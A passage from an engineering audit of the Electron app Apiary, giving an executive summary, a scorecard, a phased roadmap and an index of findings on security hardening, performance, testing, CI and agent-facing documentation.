│   │   ├── features/              workspace · sidebar · pane · transcript · terminal · git · layout · settings · themes · dialogs · update
│   │   ├── state/                 external stores + uiState + windowParams
│   │   └── ui/                    primitives (Modal, Menu, useEscape, useResizeDrag, ErrorBoundary, icons, notifications, errors)
│   └── shared/
│       ├── ipc/                   contract.ts · guards.ts
│       ├── domain/                session · git · tabs (ptyId helpers) · settings · update · plugins · log
│       ├── search/                fuzzy · treeFilter · sessionRank
│       ├── theme/                 spec · validate · readability · color · cssVars · prompt · builtins · state · effects/
│       └── activity · redact · mrRefs · gitMessages · forkLabel · promptPreview · treeWalk
└── tests/
    ├── CLAUDE.md                  which layer, how to run one, fixtures are recordings
    ├── unit/ integration/ component/ e2e/{live,bench}/ contract/
    └── fixtures/                  activity/ · titles/ · makeSession.ts · bin/ (fake glab, fake code)
```

**Folder-name trap.** The ESLint restricted-import patterns are `**/main/**` and
`**/renderer/**`. Never create a subfolder with either name anywhere, for example
`renderer/features/main/`, or imports through it will be misflagged.

## 4. Executive summary

### 4.1 Overall assessment

Apiary is in better shape than most codebases of its size (about 20k lines of source and 12k
lines of tests). The domain invariants are explicit and mostly enforced. It has four test layers,
with component tests on a real stylesheet and real pointer events. ESLint encodes the process
boundaries. The sandboxed renderer uses a typed bridge. Themes are data behind a strict validator,
and plugins return data only. `CLAUDE.md` is accurate: 0 of about 90 named symbols are missing,
and only 7 statements are stale. The weak points are growth-related rather than design-related:

1. **The runtime is out of support, and the release pipeline trusts too much.** Electron 38 no
   longer gets Chromium fixes, and hostile transcript content reaches Chromium. The release job
   gives a write token to every `npm ci` install script and to tag-pinned actions. The updater
   trusts a hash that comes from the same release it is checking. (SEC-1, SEC-4, SEC-5, TEST-13)
2. **There is a realistic path from transcript to action.** The DOMPurify default config lets
   transcript markdown carry `<style>`, `<form>` and popovers. A relative link like `?restore=...`
   passes the navigation guard and reloads the window into an attacker-chosen layout that resumes
   sessions. Pasted text can close a bracketed paste and run as keystrokes. (SEC-2, SEC-6)
3. **Background work grows with library size, not with change size.** Every watcher event
   re-reads every transcript and spawns 3 git processes per folder. Git actions wait for a full
   rescan before they answer. Every window fetches the full tree 3 to 5 times per change and
   re-renders at 2 Hz while any pty prints, with no `React.memo` anywhere. (MAIN-1 to MAIN-4,
   UI-3 to UI-5)
4. **Three files act as god objects, and the IPC contract is hand-written four times.**
   `AppService` (57 methods, and it builds its own dependencies), `ipc.ts` (a second service layer)
   and `App.tsx` (30 `useState`, 27 `useEffect`) are where every feature lands. Adding one IPC call
   means six edits, and the main side is not type-linked to `ApiaryApi`. (MAIN-11, MAIN-13 to
   MAIN-15, UI-1, UI-2)
5. **The test pyramid has holes at the seams.** `ipc.ts`, `index.ts` and the preload are covered
   only by e2e. The e2e suite never runs in CI. The component-test fake has already drifted from
   main in six checked behaviours. There is no coverage measurement. The native-ABI rebuild dance
   poisons concurrent runs, although only better-sqlite3 actually needs it. (TEST-1, TEST-4,
   TEST-5, TEST-11)
6. **`CLAUDE.md` is excellent prose in the wrong shape for an agent.** It is about 11k tokens,
   always loaded, and ordered as war stories. It has no command reference, no definition of done,
   no versioning rule and no "how to add X" recipes, and one stale sentence invites a known bug
   back. (DOC-1 to DOC-7)

There are also **four user-visible bugs** that are cheap to fix:

- a Composer draft is sent to the wrong session after switching tabs (UI-12);
- Escape in the theme-name field closes all of Settings and reverts the preview (UI-13);
- a stale git status or plugin result can show for the wrong tab (UI-14);
- a hover-opened layout picker steals keyboard focus (UI-28).

### 4.2 Scorecard

| Area | Rating | One line |
| --- | --- | --- |
| Security posture | Fair | Good sandboxing and spawn discipline; outdated Electron, a lax HTML sanitiser config, and a supply-chain gap on the update path |
| Modularity and abstractions | Fair | Clean leaf modules; three god objects and a hand-maintained 4-copy IPC contract |
| Extensibility | Fair | Themes and plugin data model are well designed; plugin registration, settings and IPC need too many hand edits |
| Performance | Fair | Good decisions (search worker, rendered-screen activity); full rescans per event and whole-window re-renders at 2 Hz |
| Testability and test harness | Good | Four layers, recorded fixtures, hermetic e2e homes; seams missing in `ipc.ts`/`AppService`, fake drift, no CI e2e, ABI trap |
| Tooling and CI | Fair | Strict TS, type-aware lint and hooks; release can publish partially, EOL toolchain, no coverage |
| Documentation for agents | Good content, poor shape | Accurate and deep; too large to always load; lacks commands, DoD and recipes |
| File structure | Fair | Sensible top level; flat `src/main` and `renderer/components`, 2,655-line `styles.css` |
| Accessibility | Weak | Dialogs lack focus management and names; tree, tabs and menus are pointer-first |

### 4.3 Top 12 by value for effort

| # | ID | Title | Severity | Effort |
| --- | --- | --- | --- | --- |
| 1 | UI-12 | Composer draft leaks to another session | high | S |
| 2 | SEC-2 | Lock down transcript HTML and the navigation guard | medium | S |
| 3 | SEC-6 | Strip bracketed-paste terminators from pasted text | medium | S |
| 4 | MAIN-16 step 1 | Atomic `settings.json` / `session-layout.json` writes | medium | S |
| 5 | MAIN-4 | Git actions refresh one project, not the library | high | S |
| 6 | UI-5 + UI-4 steps 1, 3 | Stable contexts, `activeTabs` equality, `memo(MessageRow)` | high | S |
| 7 | DOC-3 + DOC-5 | Commands, definition of done, version rule in CLAUDE.md | high | S |
| 8 | TEST-13 + SEC-4 | All-or-nothing release with a least-privilege token | high | M |
| 9 | SEC-3 | Ignore test hooks when packaged; Electron fuses | medium | S/M |
| 10 | TEST-1 + TEST-2 | End the ABI trap; unit tests in pre-push | high | M |
| 11 | MAIN-1 (+ MAIN-2, MAIN-3) | Incremental, path-scoped rescans | high | M |
| 12 | MAIN-11 | One typed IPC contract with runtime guards | high | M |

## 5. Roadmap: phases and order of work

Phases are ordered by risk and dependency. Inside a phase, items without a *Depends on* can be
done in any order, and in parallel by different agents, as long as each works in its own branch or
worktree. Each area part (A to E) also ends with that reviewer's own suggested order. **Where they
differ, this section wins.**

```mermaid
flowchart LR
  P0["Phase 0<br/>Bugs + guard rails<br/>(S items)"] --> P1["Phase 1<br/>Security + platform<br/>+ agent docs"]
  P0 --> P2["Phase 2<br/>Test harness<br/>foundation"]
  P2 --> P3["Phase 3<br/>Performance<br/>(measure first)"]
  P1 --> P4["Phase 4<br/>Contracts + types"]
  P2 --> P4
  P4 --> P5["Phase 5<br/>Decomposition<br/>main + renderer"]
  P3 --> P5
  P5 --> P6["Phase 6<br/>Extensibility"]
  P5 --> P7["Phase 7<br/>UI primitives + a11y"]
  P6 --> P8["Phase 8<br/>Structure, CSS,<br/>upgrades, packaging"]
  P7 --> P8
```

### Phase 0: bugs and cheap guard rails (all S, independent)

- **User-visible bugs:** UI-12 (Composer key), UI-13 step 2 (theme-name Escape), UI-14 (stale
  git/plugin responses), UI-28 (picker focus theft), UI-16 (raw IPC error text in BranchSwitcher).
- **Safety fixes:** SEC-2, SEC-6, SEC-8 steps 2, 5 and 6 (NaN cursor, `reportLayout` window
  number, `importSessions` paths), SEC-9 (`--end-of-options`), SEC-10 (permission handler),
  SEC-11 (redaction).
- **Robustness:**
  - MAIN-16 step 1 (atomic JSON writes);
  - MAIN-19 items 1-3 and 5 (`fireAndForget`, guarded startup, process-level handlers, VS Code
    `error` listener);
  - MAIN-20 (quit stops everything);
  - MAIN-12 steps 1-2 (rescans reach every window);
  - MAIN-8 (rebuild during a pass).
- **Docs that pay back immediately:** DOC-2 (stale statements), DOC-3 (commands), DOC-5 (DoD,
  versioning), DOC-6 (env vars and on-disk state). Put them at the top of today's `CLAUDE.md`
  now; DOC-1 moves them later.
- **Lint and repo guard rails:** SHARED-4, SHARED-5, SHARED-6, STRUCT-5, TEST-16 (the free
  rules).
- **E2E hermeticity:** TEST-8, TEST-9, TEST-10.

### Phase 1: security, platform and agent documentation

1. SEC-3 step 1 (test hooks ignored when packaged).
2. TEST-13 + SEC-4 + TEST-12: the release pipeline restructure, SHA-pinned actions, concurrency,
   caches, Dependabot.
3. TEST-1 (ABI fix), then SEC-1 / TEST-17 step 2 (Electron 44, electron-builder 26,
   `@electron/rebuild` 4, better-sqlite3 for the new ABI), then SEC-3 step 2 (fuses).
4. SEC-5 (signed update metadata) and SEC-7 (safe download path, re-hash before open).
5. SEC-12 (size caps for huge JSONL lines).
6. **DOC-1** (restructure `CLAUDE.md` into a short root plus nested files), with **DOC-4**
   (recipes) and **DOC-7** (feature map), then **DOC-11** (the doc-reference check). This is done
   early because every later phase is implemented by agents that read these files.

### Phase 2: test harness foundation

TEST-2 (unit/integration split, unit tests in pre-push), TEST-4 (ipc.ts under test: settings
merge, channel parity), TEST-5 (contract tests: fake against real, then fix the drift), TEST-3
(coverage, report only), TEST-14 (console-error guard, then the TerminalView race), TEST-11
(`@smoke` e2e on Linux CI).

### Phase 3: performance (log a before/after measurement for each)

- **Main:**
  1. MAIN-1 step 1 (refresh pass logging), then MAIN-2, MAIN-3, MAIN-4.
  2. MAIN-1 itself (incremental, path-scoped rescans).
  3. MAIN-7, MAIN-25, MAIN-5, MAIN-6, MAIN-10.
- **Renderer:**
  1. UI-5, then UI-4 steps 1 and 3.
  2. UI-7, UI-8, UI-11, UI-6.
  3. UI-3 (one tree store).

### Phase 4: contracts and types

MAIN-22 (single-source types, incl. SHARED-2), SHARED-1 (split `api.ts` and `types.ts` by domain),
MAIN-11 (typed contract, generated preload, registrar with guards; absorbs the rest of SEC-8 and
MAIN-19 item 4), MAIN-21 (pty-id helpers, then `TerminalRef`; absorbs UI-17 and SHARED-3),
MAIN-9 (cheaper `gitStatus` with a `null` outcome), SHARED-7, SHARED-8, TEST-15 (strict flags).

### Phase 5: decomposition

- **Main:**
  1. MAIN-16 steps 2-5 (`SettingsService`), after TEST-4 step 1.
  2. MAIN-13 (split `ipc.ts`).
  3. MAIN-15 (`app/env`, `WindowManager`, lifecycle).
  4. MAIN-14 (services behind the `AppService` facade), with TEST-6.
  5. MAIN-23 (one exec wrapper).
- **Renderer:**
  1. UI-2 (workspace reducer).
  2. UI-1 (App hooks and providers).
  3. UI-21, UI-19, UI-20, UI-22.
  4. UI-18.
  5. Finish UI-4 (memo the rows once props are stable).

### Phase 6: extensibility

MAIN-17 (open plugin registry and generic ref resolution, ready for a GitHub plugin), MAIN-18
(session-source seam), MAIN-24, MAIN-26 + UI-10 (pty fan-out and shared subscriptions).

### Phase 7: UI primitives and accessibility

UI-13 (`useEscape`), UI-25 (`Modal`), UI-26 (tabs, menus, hover card), UI-24 (error boundaries),
UI-23 (explicit catch policy), UI-29 (motion, colour-only state, `lang`), UI-27 (keyboard tree),
UI-32 (icons).

### Phase 8: structure, CSS, upgrades and packaging

UI-30 (CSS partials, z-index scale, tokens, control layer), UI-31 (feature folders), STRUCT-2 via
§3.2 (main folders), STRUCT-1, STRUCT-4, TEST-19, DOC-8, DOC-9, DOC-10, TEST-7 (packaged smoke),
TEST-18 (slimmer package), the rest of TEST-17 (Vitest, electron-vite, xterm 6, React 19, marked,
chokidar, TypeScript 7), and UI-9 and UI-33 only if measurements call for them.

**Why folder moves come last.** Moving files while the big splits are in flight causes constant
conflicts. Doing UI-19, UI-20, UI-21 and MAIN-13, MAIN-14 first means the split files are created
directly in their final homes.

## 6. Index of all findings

115 findings. Phase numbers refer to §5. An item listed in two phases is split: its early steps come in the first phase and the rest in the second. Severity and effort are the area reviewer's ratings.

| ID | Title | Area | Severity | Effort | Phase | Depends on |
| --- | --- | --- | --- | --- | --- | --- |
| [SEC-1](#sec-1-electron-38-is-out-of-support-and-has-known-high-severity-cves-and-npm-audit---omitdev-hides-this) | Electron 38 is out of support and has known high-severity CVEs, and `npm audit --omit=dev` hides this | Security | high | M | 1 | — |
| [SEC-2](#sec-2-a-transcript-can-inject-forms-style-and-same-window-navigations-one-click-on-a-transcript-link-reloads-the-window-with-an-attacker-chosen-restore-which-auto-resumes-sessions) | A transcript can inject forms, `<style>` and same-window navigations; one click on a transcript link reloads the window with an attacker-chosen `?restore=`, which auto-resumes sessions | Security | medium | S | 0 | — |
| [SEC-3](#sec-3-no-electron-fuses-and-test-only-environment-hooks-stay-live-in-packaged-builds-including-one-that-loads-any-url-with-the-full-preload-bridge) | No Electron fuses, and test-only environment hooks stay live in packaged builds (including one that loads any URL with the full preload bridge) | Security | medium | S | 1 | — |
| [SEC-4](#sec-4-the-release-job-gives-a-contents-write-token-to-every-install-script-and-third-party-action-and-that-token-can-replace-the-update-feed) | The release job gives a `contents: write` token to every install script and third-party action, and that token can replace the update feed | Security | medium | S | 1 | — |
| [SEC-5](#sec-5-update-authenticity-rests-only-on-a-sha-512-served-by-the-same-release-as-the-installer-and-the-assisted-download-is-opened-without-gatekeeper-quarantine) | Update authenticity rests only on a SHA-512 served by the same release as the installer, and the assisted download is opened without Gatekeeper quarantine | Security | medium | M | 1 | — |
| [SEC-6](#sec-6-pasted-text-can-end-the-bracketed-paste-early-and-run-as-keystrokes-both-in-the-composer-into-claude-and-in-terminals) | Pasted text can end the bracketed paste early and run as keystrokes, both in the Composer (into Claude) and in terminals | Security | medium | S | 0 | — |
| [SEC-7](#sec-7-assisted-download-filename-is-decoded-from-feed-data-into-a-path-deleted-and-written-before-verification-and-re-opened-later-without-re-checking) | Assisted-download filename is decoded from feed data into a path, deleted and written before verification, and re-opened later without re-checking | Security | low | S | 1 | — |
| [SEC-8](#sec-8-several-ipc-handlers-trust-renderer-arguments-types-ranges-and-ownership-one-gets-stuck-in-an-endless-loop-on-nan) | Several IPC handlers trust renderer arguments' types, ranges and ownership; one gets stuck in an endless loop on `NaN` | Security | low | M | 0, 4 | — |
| [SEC-9](#sec-9-git-calls-that-take-ref-names-from-the-ui-have-no---end-of-options-or----separator) | Git calls that take ref names from the UI have no `--end-of-options` or `--` separator | Security | low | S | 0 | — |
| [SEC-10](#sec-10-no-permission-request-or-check-handler-electrons-default-grants-every-permission-request) | No permission request or check handler; Electron's default grants every permission request | Security | low | S | 0 | — |
| [SEC-11](#sec-11-log-redaction-misses-credentials-in-urls-and-several-common-token-shapes) | Log redaction misses credentials in URLs and several common token shapes | Security | low | S | 0 | — |
| [SEC-12](#sec-12-a-single-huge-jsonl-or-one-huge-line-can-stall-the-main-process) | A single huge JSONL, or one huge line, can stall the main process | Security | low | M | 1 | — |
| [SEC-13](#sec-13-macos-entitlements-are-broader-than-electron-needs-this-only-takes-effect-once-the-app-is-signed) | macOS entitlements are broader than Electron needs (this only takes effect once the app is signed) | Security | low | S | 8 | — |
| [MAIN-1](#main-1-a-watcher-event-triggers-a-full-library-rescan-every-jsonl-re-read-and-every-folder-re-resolved-with-git) | A watcher event triggers a full-library rescan: every JSONL re-read and every folder re-resolved with git | Main | high | M | 3 | MAIN-2, MAIN-3 |
| [MAIN-2](#main-2-each-refresh-commits-two-fsyncing-transactions-per-project-on-the-main-thread-and-re-upserts-unchanged-rows) | Each refresh commits two fsync'ing transactions per project on the main thread, and re-upserts unchanged rows | Main | medium | S | 3 | MAIN-1 |
| [MAIN-3](#main-3-resolveproject-spawns-three-sequential-git-processes-per-folder) | `resolveProject` spawns three sequential git processes per folder | Main | medium | S | 3 | — |
| [MAIN-4](#main-4-git-mutations-wait-for-a-full-library-rescan-before-replying-the-rescan-and-broadcast-step-is-pasted-9-times) | Git mutations wait for a full-library rescan before replying; the "rescan and broadcast" step is pasted 9 times | Main | high | S | 3 | MAIN-13 |
| [MAIN-5](#main-5-the-pty-replay-buffer-is-dead-in-production-and-costs-a-copy-of-up-to-256-kb-on-every-output-chunk) | The pty replay buffer is dead in production and costs a copy of up to 256 KB on every output chunk | Main | medium | S | 3 | — |
| [MAIN-6](#main-6-a-pty-that-exits-by-itself-leaks-its-headless-xterm-and-bookkeeping-pty-state-is-spread-over-9-parallel-maps) | A pty that exits by itself leaks its headless xterm and bookkeeping; pty state is spread over 9 parallel maps | Main | medium | S | 3 | MAIN-5 |
| [MAIN-7](#main-7-the-note-index-is-deleted-and-rebuilt-on-every-refresh-one-transaction-per-note) | The note index is deleted and rebuilt on every refresh, one transaction per note | Main | medium | S | 3 | — |
| [MAIN-8](#main-8-rebuild-index-silently-does-nothing-but-clear-while-a-pass-is-running) | "Rebuild index" silently does nothing but clear while a pass is running | Main | low | S | 0 | — |
| [MAIN-9](#main-9-git-status-polling-runs-4-sequential-git-processes-per-pane-every-5-s-and-not-a-repo-is-an-exception-every-poll) | Git status polling runs 4 sequential git processes per pane every 5 s, and "not a repo" is an exception every poll | Main | medium | S | 4 | MAIN-11 |
| [MAIN-10](#main-10-synchronous-filesystem-work-on-hot-ipc-paths) | Synchronous filesystem work on hot IPC paths | Main | low | S | 3 | MAIN-16 |
| [MAIN-11](#main-11-the-ipc-contract-is-written-four-times-by-hand-make-one-typed-channel-map-the-source-of-truth) | The IPC contract is written four times by hand; make one typed channel map the source of truth | Main | high | M | 4 | MAIN-12, MAIN-13, MAIN-19, MAIN-21, MAIN-22 |
| [MAIN-12](#main-12-mainrenderer-events-are-sent-by-six-hand-rolled-broadcast-loops-and-some-go-only-to-the-focused-window) | Main→renderer events are sent by six hand-rolled broadcast loops, and some go only to the focused window | Main | medium | S | 0 | MAIN-11 |
| [MAIN-13](#main-13-ipcts-is-a-second-service-layer-split-it-into-a-registrar-plus-thin-per-domain-handler-modules) | `ipc.ts` is a second service layer: split it into a registrar plus thin per-domain handler modules | Main | high | M | 5 | MAIN-11 |
| [MAIN-14](#main-14-appservice-is-a-god-object-and-a-hidden-composition-root-split-it-into-cohesive-services-behind-a-temporary-facade) | `AppService` is a god object and a hidden composition root: split it into cohesive services behind a temporary facade | Main | high | L | 5 | MAIN-15, MAIN-16, MAIN-21 |
| [MAIN-15](#main-15-make-the-composition-root-explicit-move-window-management-and-test-overrides-out-of-indexts) | Make the composition root explicit; move window management and test overrides out of `index.ts` | Main | medium | M | 5 | MAIN-12, MAIN-14 |
| [MAIN-16](#main-16-settings-have-no-owner-the-file-is-re-read-about-10-times-written-non-atomically-and-each-new-field-is-enumerated-by-hand-in-three-places) | Settings have no owner: the file is re-read about 10 times, written non-atomically, and each new field is enumerated by hand in three places | Main | medium | M | 0, 5 | MAIN-13, MAIN-14 |
| [MAIN-17](#main-17-the-plugin-system-is-closed-at-the-edges-registration-per-plugin-dependencies-shared-context-and-ref-resolution-are-all-hardcoded) | The plugin system is closed at the edges: registration, per-plugin dependencies, shared context and ref resolution are all hardcoded | Main | medium | M | 6 | MAIN-22, MAIN-14 |
| [MAIN-18](#main-18-claudeprojects-knowledge-is-spread-over-three-modules-a-light-seam-for-a-second-data-source) | `~/.claude/projects` knowledge is spread over three modules (a light seam for a second data source) | Main | low | S | 6 | MAIN-1, MAIN-13 |
| [MAIN-19](#main-19-errors-are-handled-inconsistently-unobserved-rejections-unwrapped-ipcmainon-listeners-theme-channels-outside-the-logging-wrapper-and-one-spawn-with-no-error-listener) | Errors are handled inconsistently: unobserved rejections, unwrapped `ipcMain.on` listeners, theme channels outside the logging wrapper, and one spawn with no `error` listener | Main | medium | S | 0 | MAIN-11 |
| [MAIN-20](#main-20-quit-does-not-stop-everything-it-started) | Quit does not stop everything it started | Main | low | S | 0 | MAIN-15 |
| [MAIN-21](#main-21-pty-and-session-identifiers-are-stringly-typed-and-minted-and-parsed-in-eight-places-key-isptyid-is-a-redundant-pair) | Pty and session identifiers are stringly-typed and minted and parsed in eight places; `(key, isPtyId)` is a redundant pair | Main | medium | M | 4 | MAIN-11 |
| [MAIN-22](#main-22-types-are-duplicated-between-main-and-shared-as-mirrors) | Types are duplicated between main and shared as "mirrors" | Main | low | S | 4 | MAIN-17 |
| [MAIN-23](#main-23-seven-hand-rolled-execfile-wrappers-with-different-timeouts-buffers-and-error-shapes) | Seven hand-rolled `execFile` wrappers with different timeouts, buffers and error shapes | Main | low | S | 5 | — |
| [MAIN-24](#main-24-transcript-and-search-reads-do-more-io-than-they-keep) | Transcript and search reads do more I/O than they keep | Main | low | S | 6 | — |
| [MAIN-25](#main-25-watcher-configuration-is-broader-than-what-the-scanner-reads) | Watcher configuration is broader than what the scanner reads | Main | low | S | 3 | MAIN-13 |
| [MAIN-26](#main-26-every-pty-chunk-is-one-ipc-message-to-every-window) | Every pty chunk is one IPC message to every window | Main | low | M | 6 | MAIN-12 |
| [UI-1](#ui-1-apptsx-is-a-god-component--decompose-into-hooks--providers) | App.tsx is a god component — decompose into hooks + providers | Renderer | high | L | 5 | UI-2 |
| [UI-2](#ui-2-replace-the-six-bookkeeping-usestates-with-one-pure-workspacereducer) | Replace the six bookkeeping `useState`s with one pure `workspaceReducer` | Renderer | high | M | 5 | UI-1 |
| [UI-3](#ui-3-one-renderer-side-tree-store--today-each-watcher-tick-fetches-the-full-tree-35-times) | One renderer-side tree store — today each watcher tick fetches the full tree 3–5 times | Renderer | high | M | 3 | — |
| [UI-4](#ui-4-zero-reactmemo--the-whole-window-re-renders-at-up-to-2-hz-while-any-pty-prints) | Zero `React.memo` — the whole window re-renders at up to 2 Hz while any pty prints | Renderer | high | M | 3, 5 | UI-5, UI-1 |
| [UI-5](#ui-5-context-values-that-change-on-every-render-or-every-toast) | Context values that change on every render or every toast | Renderer | high | S | 3 | — |
| [UI-6](#ui-6-drag-resizers-re-render-the-whole-app-and-write-localstorage-on-every-mousemove) | Drag resizers re-render the whole App and write localStorage on every mousemove | Renderer | medium | S-M | 3 | — |
| [UI-7](#ui-7-usehovercard-does-orows-work-on-every-wheel-event) | `useHoverCard` does O(rows) work on every wheel event | Renderer | medium | S | 3 | — |
| [UI-8](#ui-8-transcript-memo-rows-bound-the-list-precompute-tool-summaries) | Transcript: memo rows, bound the list, precompute tool summaries | Renderer | medium | S | 3 | — |
| [UI-9](#ui-9-sidebar-list-size-measure-then-content-visibility-before-virtualization) | Sidebar list size: measure, then `content-visibility` before virtualization | Renderer | medium | M | 8 | UI-4 |
| [UI-10](#ui-10-per-instance-subscriptions-and-polling-that-should-be-shared) | Per-instance subscriptions and polling that should be shared | Renderer | low | M | 6 | — |
| [UI-11](#ui-11-useallworktrees-re-lists-worktrees-on-every-tree-change) | `useAllWorktrees` re-lists worktrees on every tree change | Renderer | low | S | 3 | — |
| [UI-12](#ui-12-composer-draft-attachments-and-model-leak-across-sessions-bug) | Composer draft, attachments and model leak across sessions (bug) | Renderer | high | S | 0 | — |
| [UI-13](#ui-13-escape-handling-is-copy-pasted-9-times-and-fires-through-nested-ui-bug) | Escape handling is copy-pasted 9 times and fires through nested UI (bug) | Renderer | medium | S | 0, 7 | UI-25 |
| [UI-14](#ui-14-async-effects-that-can-apply-stale-responses) | Async effects that can apply stale responses | Renderer | medium | S | 0 | — |
| [UI-15](#ui-15-react-hooksexhaustive-deps-disables-assessment) | `react-hooks/exhaustive-deps` disables: assessment | Renderer | low | S | 0 | — |
| [UI-16](#ui-16-branchswitcher-shows-raw-ipc-error-text-repeats-its-async-boilerplate-6-times-reports-errors-twice) | BranchSwitcher: shows raw IPC error text, repeats its async boilerplate 6 times, reports errors twice | Renderer | medium | S | 0 | — |
| [UI-17](#ui-17-stringly-typed-pty-ids-built-and-parsed-in-several-places) | Stringly-typed pty ids built and parsed in several places | Renderer | medium | S | 4 | — |
| [UI-18](#ui-18-state-modules-mostly-pure-with-a-few-misplacements-and-dead-code) | State modules: mostly pure, with a few misplacements and dead code | Renderer | low | S | 5 | — |
| [UI-19](#ui-19-split-sidebartsx-951-lines-into-sections--hooks) | Split Sidebar.tsx (951 lines) into sections + hooks | Renderer | medium | M | 5 | UI-1 |
| [UI-20](#ui-20-settingsdialog-claims-to-be-data-driven-but-is-a-600-line-ternary-make-sections-a-registry) | SettingsDialog: claims to be data-driven but is a 600-line ternary; make sections a registry | Renderer | medium | M | 5 | — |
| [UI-21](#ui-21-split-sessioncolumntsx-805-lines) | Split SessionColumn.tsx (805 lines) | Renderer | medium | M | 5 | UI-2, UI-14 |
| [UI-22](#ui-22-themessection-and-the-theme-hooks) | ThemesSection and the theme hooks | Renderer | low | S-M | 5 | UI-13 |
| [UI-23](#ui-23-ipc-promise-chains-with-no-catch-surface-as-context-free-unexpected-error) | IPC promise chains with no `catch` surface as context-free "Unexpected error" | Renderer | medium | S | 7 | — |
| [UI-24](#ui-24-errorboundary-coverage-gaps) | ErrorBoundary coverage gaps | Renderer | medium | S | 7 | UI-1 |
| [UI-25](#ui-25-dialogs-no-focus-management-4-of-them-no-escape-no-accessible-names) | Dialogs: no focus management, 4 of them no Escape, no accessible names | Renderer | high | M | 7 | UI-13 |
| [UI-26](#ui-26-tabs-menus-and-hover-cards-aria-roles-that-dont-match-behaviour) | Tabs, menus and hover cards: ARIA roles that don't match behaviour | Renderer | medium | M | 7 | UI-13 |
| [UI-27](#ui-27-sidebar-tree-and-resizers-are-pointer-first) | Sidebar tree and resizers are pointer-first | Renderer | medium | L | 7 | UI-19 |
| [UI-28](#ui-28-a-hover-opened-layout-picker-steals-keyboard-focus) | A hover-opened layout picker steals keyboard focus | Renderer | medium | S | 0 | — |
| [UI-29](#ui-29-motion-colour-only-state-and-document-language) | Motion, colour-only state and document language | Renderer | low | S | 7 | — |
| [UI-30](#ui-30-stylescss-split-into-ordered-partials-add-a-z-index-scale-finish-the-token-and-control-layer-rules) | styles.css: split into ordered partials, add a z-index scale, finish the token and control-layer rules | Renderer | medium | M | 8 | — |
| [UI-31](#ui-31-feature-oriented-file-layout) | Feature-oriented file layout | Renderer | low | M | 8 | UI-19, UI-20, UI-21 |
| [UI-32](#ui-32-inline-svg-duplication) | Inline SVG duplication | Renderer | low | S | 7 | — |
| [UI-33](#ui-33-xterm-renderer-evaluate-the-webgl-addon-for-the-visible-terminal-only) | xterm renderer: evaluate the WebGL addon for the visible terminal only | Renderer | low | M | 8 | — |
| [TEST-1](#test-1-fix-the-native-abi-trap-structurally-better-sqlite3-nativebinding-cache-plus-a-fail-fast-guard) | Fix the native ABI trap structurally (better-sqlite3 `nativeBinding` cache plus a fail-fast guard) | Tests/CI | high | M | 1 | TEST-2 |
| [TEST-2](#test-2-split-vitest-into-unit-parallel-native-free-and-integration-serial-projects-and-put-unit-in-pre-push) | Split Vitest into `unit` (parallel, native-free) and `integration` (serial) projects, and put `unit` in pre-push | Tests/CI | medium | S | 2 | TEST-1 |
| [TEST-3](#test-3-add-v8-coverage-for-the-node-and-component-runs-reported-and-not-yet-gating) | Add v8 coverage for the Node and component runs, reported and not yet gating | Tests/CI | medium | S | 2 | TEST-2 |
| [TEST-4](#test-4-bring-ipcts-under-test-extract-the-settings-merge-and-add-a-preload-to-main-channel-parity-test-with-a-mocked-electron) | Bring ipc.ts under test: extract the settings merge, and add a preload-to-main channel parity test with a mocked `electron` | Tests/CI | high | M | 2 | — |
| [TEST-5](#test-5-contract-tests-one-behavioural-spec-run-against-fakeapiary-and-against-the-real-main-process) | Contract tests: one behavioural spec run against `fakeApiary` and against the real main process | Tests/CI | high | M | 2 | TEST-4 |
| [TEST-6](#test-6-testability-seams-in-main-process-modules-that-build-their-own-dependencies) | Testability seams in main-process modules that build their own dependencies | Tests/CI | medium | M | 5 | — |
| [TEST-7](#test-7-the-search-worker-and-the-packaged-app-are-never-exercised-by-any-test) | The search worker and the packaged app are never exercised by any test | Tests/CI | medium | M | 8 | TEST-11 |
| [TEST-8](#test-8-a-relaunched-e2e-app-loses-the-harnesss-test-environment) | A relaunched e2e app loses the harness's test environment | Tests/CI | medium | S | 0 | — |
| [TEST-9](#test-9-e2e-and-integration-depend-on-the-developers-git-config-shell-dotfiles-and-claude-install) | E2E and integration depend on the developer's git config, shell dotfiles and `claude` install | Tests/CI | medium | S | 0 | — |
| [TEST-10](#test-10-no-trace-screenshot-retry-or-report-output-when-an-e2e-test-fails) | No trace, screenshot, retry or report output when an e2e test fails | Tests/CI | medium | S | 0 | — |
| [TEST-11](#test-11-run-smoke-e2e-on-linux-ci-under-xvfb) | Run `@smoke` e2e on Linux CI under xvfb | Tests/CI | high | M | 2 | TEST-9, TEST-10, TEST-1 |
| [TEST-12](#test-12-ci-hygiene-caching-concurrency-timeouts-pinning-reports) | CI hygiene: caching, concurrency, timeouts, pinning, reports | Tests/CI | medium | S | 1 | — |
| [TEST-13](#test-13-releaseyml-can-publish-a-partial-release-skips-component-tests-and-macos-has-no-ci-before-the-tag) | release.yml can publish a partial release, skips component tests, and macOS has no CI before the tag | Tests/CI | high | M | 1 | — |
| [TEST-14](#test-14-36-component-tests-print-an-uncaught-looking-xterm-typeerror-and-still-pass) | 36 component tests print an uncaught-looking xterm TypeError and still pass | Tests/CI | medium | S | 2 | — |
| [TEST-15](#test-15-typescript-strictness-flags-what-each-costs) | TypeScript strictness flags: what each costs | Tests/CI | low | S for the first three, L for `noUncheckedIndexedAccess` | 4 | — |
| [TEST-16](#test-16-lint-additions-exhaustive-switches-a-cycle-check-the-jsx-namespace) | Lint additions: exhaustive switches, a cycle check, the JSX namespace | Tests/CI | low | S | 0 | — |
| [TEST-17](#test-17-dependency-upgrades-what-matters-and-in-what-order) | Dependency upgrades: what matters and in what order | Tests/CI | medium | L overall | 8 | TEST-1, TEST-12, TEST-16 |
| [TEST-18](#test-18-packaging-ships-renderer-only-dependencies-and-possibly-unused-native-prebuilds) | Packaging ships renderer-only dependencies and possibly unused native prebuilds | Tests/CI | low | S | 8 | TEST-7 |
| [TEST-19](#test-19-test-organisation-split-the-big-file-share-fixtures-fix-the-layer-labels) | Test organisation: split the big file, share fixtures, fix the layer labels | Tests/CI | low | M | 8 | TEST-9, TEST-5 |
| [DOC-1](#doc-1-restructure-claudemd-into-a-short-root-file-plus-nested-co-located-docs) | Restructure CLAUDE.md into a short root file plus nested, co-located docs | Docs/Shared/Structure | high | M | 1 | DOC-2, DOC-3, DOC-4, DOC-5 |
| [DOC-2](#doc-2-fix-the-stale-or-incorrect-statements-in-claudemd-and-code-comments) | Fix the stale or incorrect statements in CLAUDE.md and code comments | Docs/Shared/Structure | medium | S | 0 | DOC-1 |
